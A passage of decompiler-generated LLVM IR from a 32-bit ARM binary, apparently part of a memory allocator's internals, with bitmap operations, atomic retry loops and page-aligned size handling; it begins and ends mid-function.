  %v2_139dc = xor i32 %v2_139d0, %v1_139cc
  store i32 %v2_139dc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.5, i32* %r1.global-to-local, align 4
  %v3_139e4 = icmp ult i32 %v1_139cc, %v2_139dc
  br i1 %v3_139e4, label %bb64, label %dec_label_pc_139f0

bb64:                                             ; preds = %dec_label_pc_139dc
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139f0

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139dc, %bb64, %dec_label_pc_139c4
  %stack_var_-44.6 = phi i32 [ %stack_var_-44.5, %dec_label_pc_139c4 ], [ %stack_var_-44.5, %dec_label_pc_139dc ], [ 1, %bb64 ]
  %v2_139f0 = add i32 %v1_139cc, %v0_1381c.pre
  store i32 %v2_139f0, i32* @sb, align 4
  %v0_139f4 = load i32, i32* @fp, align 4
  %v2_139f4 = add i32 %v0_139f4, %v1_139cc
  store i32 %v2_139f4, i32* @fp, align 4
  %v1_139f8 = add i32 %v2_139f0, 4
  %v2_139f8 = inttoptr i32 %v1_139f8 to i32*
  %v3_139f8 = load i32, i32* %v2_139f8, align 4
  store i32 %v3_139f8, i32* %r3.global-to-local, align 4
  %v0_139fc = load i32, i32* @r8, align 4
  %v1_139fc = inttoptr i32 %v0_139fc to i32*
  %v2_139fc = load i32, i32* %v1_139fc, align 4
  store i32 %v2_139fc, i32* %r2.global-to-local, align 4
  %v2_13a00 = and i32 %v2_139fc, %v3_139f8
  store i32 %v2_13a00, i32* %r3.global-to-local, align 4
  %v1_13a04 = urem i32 %v2_13a00, 2
  %v2_13a04 = icmp eq i32 %v1_13a04, 0
  br i1 %v2_13a04, label %dec_label_pc_13968, label %dec_label_pc_13830

dec_label_pc_13a10:                               ; preds = %dec_label_pc_138b4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13a14 = load i32, i32* @global_var_22408.562, align 4
  %v5_13a14 = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v5_13a14, i32* %r4.global-to-local, align 4
  %v1_13a18 = load i32, i32* @sl, align 4
  %v6_13a18 = lshr i32 %v2_13a14, %v1_13a18
  %v1_13a1c = sub i32 32, %v1_13a18
  %v7_13a20 = shl i32 %v5_13a14, %v1_13a1c
  %v8_13a20 = or i32 %v7_13a20, %v6_13a18
  store i32 %v8_13a20, i32* %r3.global-to-local, align 4
  %v1_13a24 = add i32 %v1_13a18, -32
  store i32 %v1_13a24, i32* %r1.global-to-local, align 4
  %v6_13a24 = icmp slt i32 %v1_13a24, 0
  br i1 %v6_13a24, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_13a10
  %v7_13a28 = lshr i32 %v5_13a14, %v1_13a24
  store i32 %v7_13a28, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13a10, %bb65
  %v0_13a2c = phi i32 [ %v8_13a20, %dec_label_pc_13a10 ], [ %v7_13a28, %bb65 ]
  %v1_13a2c = urem i32 %v0_13a2c, 2
  store i32 %v1_13a2c, i32* %r0.global-to-local, align 4
  %v2_13a2c = icmp eq i32 %v1_13a2c, 0
  br i1 %v2_13a2c, label %dec_label_pc_13a34, label %dec_label_pc_13a90

dec_label_pc_13a34:                               ; preds = %bb66
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_13a38 = icmp eq i32 %v1_13a24, 0
  store i1 %v2_13a38, i1* @cpsr_z, align 1
  %v7_13a3c = lshr i32 1, %v1_13a1c
  store i32 %v7_13a3c, i32* %r4.global-to-local, align 4
  %v6_13a40 = shl i32 1, %v1_13a18
  store i32 %v6_13a40, i32* %r3.global-to-local, align 4
  br i1 %v6_13a24, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_13a34
  %v9_13a44 = shl i32 1, %v1_13a24
  store i32 %v9_13a44, i32* %r4.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_13a34, %bb67
  %v0_13a4c = phi i32 [ %v7_13a3c, %dec_label_pc_13a34 ], [ %v9_13a44, %bb67 ]
  store i32 %v6_13a40, i32* %r5.global-to-local, align 4
  store i32 %v2_13a14, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13a6073 = or i32 %v2_13a14, %v6_13a40
  store i32 %v2_13a6073, i32* %r1.global-to-local, align 4
  %v4_13a6474 = call i32 @function_15d38(i32 %v2_13a14, i32 %v2_13a6073, i32* nonnull @global_var_22408.562)
  store i32 %v4_13a6474, i32* %r0.global-to-local, align 4
  %v2_13a6876 = icmp eq i32 %v4_13a6474, 0
  store i1 %v2_13a6876, i1* @cpsr_z, align 1
  br i1 %v2_13a6876, label %dec_label_pc_13a70, label %dec_label_pc_13a58.dec_label_pc_13a58_crit_edge

dec_label_pc_13a58.dec_label_pc_13a58_crit_edge:  ; preds = %bb68, %dec_label_pc_13a58.dec_label_pc_13a58_crit_edge
  %v2_13a58.pre = load i32, i32* @global_var_22408.562, align 4
  %v1_13a60.pre = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_13a58.pre, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13a60 = or i32 %v2_13a58.pre, %v1_13a60.pre
  store i32 %v2_13a60, i32* %r1.global-to-local, align 4
  %v4_13a64 = call i32 @function_15d38(i32 %v2_13a58.pre, i32 %v2_13a60, i32* nonnull @global_var_22408.562)
  store i32 %v4_13a64, i32* %r0.global-to-local, align 4
  %v2_13a68 = icmp eq i32 %v4_13a64, 0
  store i1 %v2_13a68, i1* @cpsr_z, align 1
  br i1 %v2_13a68, label %dec_label_pc_13a70, label %dec_label_pc_13a58.dec_label_pc_13a58_crit_edge

dec_label_pc_13a70:                               ; preds = %dec_label_pc_13a58.dec_label_pc_13a58_crit_edge, %bb68
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* %r5.global-to-local, align 4
  store i32 %v0_13a4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a78.dec_label_pc_13a78_crit_edge, %dec_label_pc_13a70
  %v1_13a80 = phi i32 [ %v1_13a80.pre, %dec_label_pc_13a78.dec_label_pc_13a78_crit_edge ], [ %v0_13a4c, %dec_label_pc_13a70 ]
  %v2_13a78 = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v2_13a78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* %r2.global-to-local, align 4
  %v2_13a80 = or i32 %v2_13a78, %v1_13a80
  store i32 %v2_13a80, i32* %r1.global-to-local, align 4
  %v4_13a84 = call i32 @function_15d38(i32 %v2_13a78, i32 %v2_13a80, i32* nonnull @global_var_2240c.564)
  store i32 %v4_13a84, i32* %r0.global-to-local, align 4
  %v2_13a88 = icmp eq i32 %v4_13a84, 0
  store i1 %v2_13a88, i1* @cpsr_z, align 1
  br i1 %v2_13a88, label %dec_label_pc_13a90.loopexit, label %dec_label_pc_13a78.dec_label_pc_13a78_crit_edge

dec_label_pc_13a78.dec_label_pc_13a78_crit_edge:  ; preds = %dec_label_pc_13a78
  %v1_13a80.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a78

dec_label_pc_13a90.loopexit:                      ; preds = %dec_label_pc_13a78
  %v1_13a94.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a90.loopexit, %bb66
  %v1_13a94 = phi i32 [ %v1_13a94.pre, %dec_label_pc_13a90.loopexit ], [ %v0_138b8, %bb66 ]
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r0, align 4
  %v0_13a94 = load i32, i32* @fp, align 4
  %v2_13a94 = inttoptr i32 %v1_13a94 to i32*
  store i32 %v0_13a94, i32* %v2_13a94, align 4
  %v0_13a98 = load i32, i32* @fp, align 4
  %v1_13a98 = load i32, i32* @r8, align 4
  %v2_13a98 = add i32 %v1_13a98, 4
  %v3_13a98 = inttoptr i32 %v2_13a98 to i32*
  store i32 %v0_13a98, i32* %v3_13a98, align 4
  %v3_13a9c = load i32, i32* @global_var_22810.570, align 4
  store i32 %v3_13a9c, i32* %r3.global-to-local, align 4
  %v2_13aa0 = icmp eq i32 %v3_13a9c, 0
  store i1 %v2_13aa0, i1* @cpsr_z, align 1
  %v0_13aa4 = load i32, i32* @r0, align 4
  store i32 %v0_13aa4, i32* %r4.global-to-local, align 4
  br i1 %v2_13aa0, label %dec_label_pc_13af8, label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a90
  %v0_13aac = call i32 @function_15ce4()
  store i32 %v0_13aac, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13ab4 = add i32 %v0_13aac, 1032
  %v3_13ab4 = inttoptr i32 %v2_13ab4 to i32*
  store i32 0, i32* %v3_13ab4, align 4
  %v0_13ab8 = call i32 @function_15ce4()
  store i32 %v0_13ab8, i32* %r0.global-to-local, align 4
  %v1_13abc = add i32 %v0_13ab8, 1036
  %v2_13abc = inttoptr i32 %v1_13abc to i32*
  %v3_13abc = load i32, i32* %v2_13abc, align 4
  store i32 %v3_13abc, i32* %r3.global-to-local, align 4
  %v2_13ac0 = icmp eq i32 %v3_13abc, 0
  br i1 %v2_13ac0, label %dec_label_pc_13af8, label %dec_label_pc_13ac8

dec_label_pc_13ac8:                               ; preds = %dec_label_pc_13aac
  %v1_13acc = add i32 %v0_13ab8, 1032
  store i32 %v1_13acc, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13ae4 = icmp eq i32 %v1_13acc, -38
  br i1 %v4_13ae4, label %dec_label_pc_13ae8, label %dec_label_pc_13af8

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ac8
  store i32 ptrtoint (i32* @global_var_22810.570 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13ac8, %dec_label_pc_13ae8, %dec_label_pc_13aac, %dec_label_pc_13a90
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v3_13b00 = mul i32 %v1_1388c, 16
  %v2_13b04 = add i32 %v3_13b00, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v2_13b04, i32* %r3.global-to-local, align 4
  %v1_13b08 = add i32 %v3_13b00, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v1_13b08, i32* %r1.global-to-local, align 4
  %v1_13b0c = load i32, i32* @r8, align 4
  %v2_13b0c = add i32 %v1_13b0c, 8
  %v3_13b0c = inttoptr i32 %v2_13b0c to i32*
  store i32 %v1_13b08, i32* %v3_13b0c, align 4
  %v0_13b10 = load i32, i32* %r3.global-to-local, align 4
  %v1_13b10 = add i32 %v0_13b10, 4
  %v2_13b10 = inttoptr i32 %v1_13b10 to i32*
  %v3_13b10 = load i32, i32* %v2_13b10, align 4
  store i32 %v3_13b10, i32* %r2.global-to-local, align 4
  %v1_13b14 = load i32, i32* @r8, align 4
  %v2_13b14 = add i32 %v1_13b14, 12
  %v3_13b14 = inttoptr i32 %v2_13b14 to i32*
  store i32 %v3_13b10, i32* %v3_13b14, align 4
  %v0_13b18 = load i32, i32* @r8, align 4
  %v1_13b18 = load i32, i32* %r1.global-to-local, align 4
  %v2_13b18 = add i32 %v1_13b18, 12
  %v3_13b18 = inttoptr i32 %v2_13b18 to i32*
  store i32 %v0_13b18, i32* %v3_13b18, align 4
  store i32 %stack_var_-44.3, i32* @r0, align 4
  %v0_13b20 = load i32, i32* @r8, align 4
  %v1_13b20 = add i32 %v0_13b20, 12
  %v2_13b20 = inttoptr i32 %v1_13b20 to i32*
  %v3_13b20 = load i32, i32* %v2_13b20, align 4
  store i32 %v3_13b20, i32* %r3.global-to-local, align 4
  %v2_13b24 = icmp eq i32 %stack_var_-44.3, 0
  %v2_13b28 = add i32 %v3_13b20, 8
  %v3_13b28 = inttoptr i32 %v2_13b28 to i32*
  store i32 %v0_13b20, i32* %v3_13b28, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r4, align 4
  br i1 %v2_13b24, label %dec_label_pc_13b34, label %dec_label_pc_13c8c

dec_label_pc_13b34:                               ; preds = %dec_label_pc_13af8, %dec_label_pc_13c8c
  %v1_13b40 = phi i32 [ ptrtoint (i32* @global_var_22408.562 to i32), %dec_label_pc_13af8 ], [ %v1_13b38.pre, %dec_label_pc_13c8c ]
  %v0_13b34 = load i32, i32* @r6, align 4
  %v1_13b34 = add i32 %v0_13b34, 8
  store i32 %v1_13b34, i32* %r2.global-to-local, align 4
  %v2_13b38 = add i32 %v1_13b34, %v1_13b40
  %v3_13b38 = inttoptr i32 %v2_13b38 to i32*
  %v4_13b38 = load i32, i32* %v3_13b38, align 4
  store i32 %v4_13b38, i32* @r3, align 4
  %v2_13b3c = icmp eq i32 %v4_13b38, 0
  store i1 %v2_13b3c, i1* @cpsr_z, align 1
  store i32 %v2_13b38, i32* %r5.global-to-local, align 4
  br i1 %v2_13b3c, label %dec_label_pc_13b34.dec_label_pc_13b90_crit_edge, label %dec_label_pc_13b48

dec_label_pc_13b34.dec_label_pc_13b90_crit_edge:  ; preds = %dec_label_pc_13b34
  %v1_13b98.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b34
  %v0_13b48 = call i32 @function_15ce4()
  store i32 %v0_13b48, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13b50 = load i32, i32* %r2.global-to-local, align 4
  %v2_13b50 = load i32, i32* @r4, align 4
  %v3_13b50 = add i32 %v2_13b50, %v1_13b50
  %v4_13b50 = inttoptr i32 %v3_13b50 to i32*
  store i32 0, i32* %v4_13b50, align 4
  %v0_13b54 = call i32 @function_15ce4()
  store i32 %v0_13b54, i32* %r0.global-to-local, align 4
  %v0_13b58 = load i32, i32* @r6, align 4
  %v1_13b58 = add i32 %v0_13b58, 12
  store i32 %v1_13b58, i32* @r3, align 4
  %v1_13b5c = load i32, i32* @r4, align 4
  %v2_13b5c = add i32 %v1_13b5c, %v1_13b58
  %v3_13b5c = inttoptr i32 %v2_13b5c to i32*
  %v4_13b5c = load i32, i32* %v3_13b5c, align 4
  store i32 %v4_13b5c, i32* %r2.global-to-local, align 4
  %v2_13b60 = icmp eq i32 %v4_13b5c, 0
  br i1 %v2_13b60, label %dec_label_pc_13b90, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b48
  %v0_13b6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13b6c, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13b80 = icmp eq i32 %v0_13b6c, -38
  br i1 %v4_13b80, label %dec_label_pc_13b84, label %dec_label_pc_13b90

dec_label_pc_13b84:                               ; preds = %dec_label_pc_13b68
  store i32 -38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13b34.dec_label_pc_13b90_crit_edge, %dec_label_pc_13b68, %dec_label_pc_13b84, %dec_label_pc_13b48, %dec_label_pc_137cc, %bb70
  %v1_13b98 = phi i32 [ %v1_13b98.pre, %dec_label_pc_13b34.dec_label_pc_13b90_crit_edge ], [ %v0_13b6c, %dec_label_pc_13b68 ], [ -38, %dec_label_pc_13b84 ], [ %v0_13b54, %dec_label_pc_13b48 ], [ 0, %dec_label_pc_137cc ], [ %v1_13c44, %bb70 ]
  store i32 %v3_137cc, i32* @r4, align 4
  store i32 %v6_137cc, i32* @r5, align 4
  store i32 %v9_137cc, i32* @r6, align 4
  store i32 %v12_137cc, i32* @r7, align 4
  store i32 %v15_137cc, i32* @r8, align 4
  store i32 %v18_137cc, i32* @sb, align 4
  store i32 %v21_137cc, i32* @sl, align 4
  store i32 %v24_137cc, i32* @fp, align 4
  ret i32 %v1_13b98

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13be8
  %v0_13ba8 = load i32, i32* @r6, align 4
  store i32 1, i32* @r2, align 4
  %v2_13bb0 = add i32 %v0_13ba8, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 12)
  store i32 %v2_13bb0, i32* %r1.global-to-local, align 4
  %v0_13bb4 = load i32, i32* @r5, align 4
  store i32 %v0_13bb4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_13bbc = inttoptr i32 %v0_13bb4 to i32*
  %v3_13bbc = call i32 @function_15864(i32* %v2_13bbc, i32 %v2_13bb0)
  store i32 %v3_13bbc, i32* %r0.global-to-local, align 4
  %v0_13bc4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13bc0

dec_label_pc_13bc0:                               ; preds = %dec_label_pc_13868, %dec_label_pc_13ba4
  %v0_13bc4 = phi i32 [ %v0_13bc4.pre, %dec_label_pc_13ba4 ], [ %v3_13870, %dec_label_pc_13868 ]
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r0.global-to-local, align 4
  %v1_13bc4 = add i32 %v0_13bc4, 8
  store i32 %v1_13bc4, i32* %r3.global-to-local, align 4
  %v2_13bc8 = add i32 %v0_13bc4, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 8)
  store i32 %v2_13bc8, i32* @r7, align 4
  br label %dec_label_pc_13bcc

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13bcc.dec_label_pc_13bcc_crit_edge, %dec_label_pc_13bc0
  %v0_13bcc = phi i32 [ %v0_13bcc.pre, %dec_label_pc_13bcc.dec_label_pc_13bcc_crit_edge ], [ %v2_13bc8, %dec_label_pc_13bc0 ]
  %v1_13bcc = inttoptr i32 %v0_13bcc to i32*
  %v2_13bcc = load i32, i32* %v1_13bcc, align 4
  store i32 %v2_13bcc, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13bcc, i32* %r0.global-to-local, align 4
  store i32 %v0_13bcc, i32* %r2.global-to-local, align 4
  %v4_13bdc = call i32 @function_15d38(i32 %v2_13bcc, i32 1, i32* %v1_13bcc)
  store i32 %v4_13bdc, i32* %r0.global-to-local, align 4
  %v2_13be0 = icmp eq i32 %v4_13bdc, 0
  store i1 %v2_13be0, i1* @cpsr_z, align 1
  br i1 %v2_13be0, label %dec_label_pc_13be8, label %dec_label_pc_13bcc.dec_label_pc_13bcc_crit_edge

dec_label_pc_13bcc.dec_label_pc_13bcc_crit_edge:  ; preds = %dec_label_pc_13bcc
  %v0_13bcc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13bcc

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bcc
  %v0_13b9c = load i32, i32* @r4, align 4
  %v2_13b9c = icmp eq i32 %v0_13b9c, 0
  br i1 %v2_13b9c, label %dec_label_pc_13888.loopexit, label %dec_label_pc_13ba4

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13bec, %dec_label_pc_13c24, %dec_label_pc_138a4
  %v3_13bf0 = load i32, i32* @global_var_22810.570, align 4
  store i32 %v3_13bf0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22810.570 to i32), i32* %r2.global-to-local, align 4
  store i32 %v3_13bf0, i32* %r0.global-to-local, align 4
  %v4_13c00 = call i32 @function_15d38(i32 %v3_13bf0, i32 1, i32* nonnull @global_var_22810.570)
  %v2_13c04 = icmp eq i32 %v4_13c00, 0
  store i1 %v2_13c04, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_22810.570 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 1, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22814.574 to i32), i32* %r1.global-to-local, align 4
  br i1 %v2_13c04, label %dec_label_pc_13c1c, label %dec_label_pc_13bec

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_13bec
  %v0_13c1c = load i32, i32* @r4, align 4
  %v2_13c1c = icmp eq i32 %v0_13c1c, 0
  br i1 %v2_13c1c, label %dec_label_pc_138b4, label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c1c
  %v3_13c24 = call i32 @function_15864(i32* nonnull @global_var_22810.570, i32 ptrtoint (i32* @global_var_22814.574 to i32))
  store i32 %v3_13c24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13bec

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_137dc
  %v2_13c2c = inttoptr i32 %v1_137dc to i32*
  %v3_13c2c = load i32, i32* %v2_13c2c, align 4
  store i32 %v3_13c2c, i32* %r0.global-to-local, align 4
  %v1_13c30 = and i32 %v3_137e0, -2
  %v1_13c34 = urem i32 %v3_13c2c, 2
  %v2_13c34 = icmp eq i32 %v1_13c34, 0
  %v2_13c38 = add i32 %v3_13c2c, %v1_13c30
  store i32 %v2_13c38, i32* @r1, align 4
  br i1 %v2_13c34, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_13c2c
  call void @llvm.trap()
  unreachable

bb70:                                             ; preds = %dec_label_pc_13c2c
  %v2_13c40 = sub i32 %v1_137dc, %v3_13c2c
  store i32 %v2_13c40, i32* %r0.global-to-local, align 4
  %v1_13c44 = call i32 @function_14740(i32 %v2_13c40)
  store i32 %v1_13c44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13c4c:                               ; preds = %dec_label_pc_13888
  store i32 %v1_1388c, i32* %r0.global-to-local, align 4
  %v3_13c50 = mul i32 %v1_1388c, 16
  %v2_13c54 = add i32 %v3_13c50, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v2_13c54, i32* %r3.global-to-local, align 4
  %v1_13c58 = add i32 %v3_13c50, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v1_13c58, i32* %r2.global-to-local, align 4
  store i32 %v1_13c58, i32* %v6_13890, align 4
  %v0_13c60 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c60 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c60 = add i32 %v1_13c60, 4
  %v3_13c60 = inttoptr i32 %v2_13c60 to i32*
  store i32 %v0_13c60, i32* %v3_13c60, align 4
  br label %dec_label_pc_138a4

dec_label_pc_13c68:                               ; preds = %dec_label_pc_138f4
  store i32 ptrtoint (i32* @global_var_22810.570 to i32), i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13914

dec_label_pc_13c7c:                               ; preds = %dec_label_pc_1394c
  store i32 %v0_13950, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13968.preheader

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13af8
  %v0_13c8c = load i32, i32* @r8, align 4
  %v0_13c90 = load i32, i32* @sb, align 4
  %v1_13c90 = add i32 %v0_13c90, -16
  %v1_13c94 = add i32 %v0_13c8c, 4111
  %v1_13ca0 = and i32 %v1_13c94, -4096
  store i32 %v1_13ca0, i32* @r0, align 4
  %v1_13ca4 = and i32 %v1_13c90, -4096
  %v2_13ca8 = sub i32 %v1_13ca4, %v1_13ca0
  store i32 %v2_13ca8, i32* %r1.global-to-local, align 4
  store i32 4, i32* @r2, align 4
  %v4_13cb0 = call i32 @function_14628(i32 %v1_13ca0, i32 %v2_13ca8, i32 4, i32 %v3_13b20)
  store i32 %v4_13cb0, i32* @r0, align 4
  %v1_13b38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13b34

; uselistorder directives
  uselistorder i32 %v3_13c50, { 1, 0 }
  uselistorder i32 %v1_13c44, { 1, 0 }
  uselistorder i32 %v3_13c2c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13bcc, { 1, 0 }
  uselistorder i32 %v0_13bc4, { 1, 0 }
  uselistorder i32 %v3_13b00, { 1, 0 }
  uselistorder i32 %v2_13a78, { 1, 0, 2 }
  uselistorder i32 %v2_13a58.pre, { 0, 2, 1 }
  uselistorder i32 %v7_13a3c, { 1, 0 }
  uselistorder i32 %v1_13a2c, { 1, 0 }
  uselistorder i32 %v1_13a24, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_139fc, { 1, 0 }
  uselistorder i32 %v2_139f4, { 1, 0 }
  uselistorder i32 %v2_139f0, { 1, 2, 0 }
  uselistorder i32 %v2_139d0, { 1, 0, 2 }
  uselistorder i32 %v1_139cc, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_1381c.pre, { 1, 2, 0 }
  uselistorder i32 %stack_var_-44.5, { 1, 2, 3, 0 }
  uselistorder i32 %v2_13990, { 1, 0, 2 }
  uselistorder i32 %v1_1398c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_13968, { 1, 0 }
  uselistorder i32 %v0_13950, { 1, 0, 2 }
  uselistorder i32 %v1_138c0, { 1, 0 }
  uselistorder i32 %v1_1388c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_13870, { 2, 1, 0 }
  uselistorder i32 %v0_13870, { 1, 0 }
  uselistorder i32 %v3_13860, { 1, 0 }
  uselistorder i32 %v4_13848, { 1, 0, 2 }
  uselistorder i32 %v0_1383c, { 1, 0 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_137f0, { 1, 0, 2 }
  uselistorder i32 %v1_137ec, { 0, 4, 1, 5, 3, 2, 6 }
  uselistorder i32 %v1_137e4, { 1, 0 }
  uselistorder i32 %v3_137e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_137dc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_137d0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 23, 24, 25, 22, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 5, 8, 9, 11, 10, 12, 19, 15, 16, 14, 13, 18, 17, 20, 21, 22, 23, 25, 24, 29, 26, 3, 2, 27, 28, 4, 30, 31, 34, 33, 32, 35, 36, 37, 38, 0, 1 }
  uselistorder i32 1032, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13bec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bc0, { 1, 0 }
  uselistorder label %dec_label_pc_13b90, { 5, 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_13b34, { 1, 0 }
  uselistorder label %dec_label_pc_13af8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13a58.dec_label_pc_13a58_crit_edge, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_139f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139b4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13968, { 1, 0 }
  uselistorder label %dec_label_pc_13968.preheader, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13914, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_138a4, { 1, 0 }
  uselistorder label %dec_label_pc_13868, { 2, 0, 1 }
  uselistorder label %bb62, { 1, 0 }
}

define i32 @function_13cc8() local_unnamed_addr {
dec_label_pc_13cc8:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_13cc8 = load i32, i32* @r4, align 4
  %v6_13cc8 = load i32, i32* @r5, align 4
  %v9_13cc8 = load i32, i32* @r6, align 4
  %v12_13cc8 = load i32, i32* @r7, align 4
  %v15_13cc8 = load i32, i32* @r8, align 4
  %v18_13cc8 = load i32, i32* @sb, align 4
  %v21_13cc8 = load i32, i32* @sl, align 4
  %v24_13cc8 = load i32, i32* @fp, align 4
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v0_13cd4 = load i32, i32* @r0, align 4
  %v1_13cd4 = add i32 %v0_13cd4, -1
  store i32 %v1_13cd4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v1_13cd4, 2147479536
  br i1 %tmp, label %dec_label_pc_14074, label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cc8
  %v2_13ce4 = icmp eq i32 %v0_13cd4, 0
  br i1 %v2_13ce4, label %.thread, label %dec_label_pc_1434c

.thread:                                          ; preds = %dec_label_pc_13ce4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_13cf8:                               ; preds = %.thread43, %.thread, %dec_label_pc_1409c
  %v1_13d10 = phi i32 [ %v1_140ac, %dec_label_pc_1409c ], [ 0, %.thread ], [ %v1_1408c, %.thread43 ]
